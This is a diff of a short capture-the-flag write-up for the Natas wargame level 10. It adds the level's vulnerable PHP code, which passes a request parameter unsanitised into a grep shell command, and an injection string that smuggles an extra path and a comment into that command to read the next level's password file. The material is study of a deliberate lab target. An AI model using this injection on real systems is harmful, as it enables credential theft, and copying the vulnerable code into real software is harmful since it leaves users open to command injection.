@@ -109,9 +109,36 @@ if($key != "") {
 ___
 
 ## 💡 Theory
-```bash
-
 ```
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i $key dictionary.txt");
+    }
+}
+?>
+```
+
+By entering . /etc/natas_webpass/natas11 # into the search box we are making grep
+
+ . search for any text
+ /etc/natas_webpass/natas11 file path to search
+ # comment out 'dictionary.txt' and stop grep from searching it.
+
+so
+```bash
+#Search for any text in /etc/natas_webpass/natas11   , #Document.txt is just a comment now 
+grep -i . /etc/natas_webpass/natas11 #Document.txt
+```
+
 ___
 
 ## 📤 Output
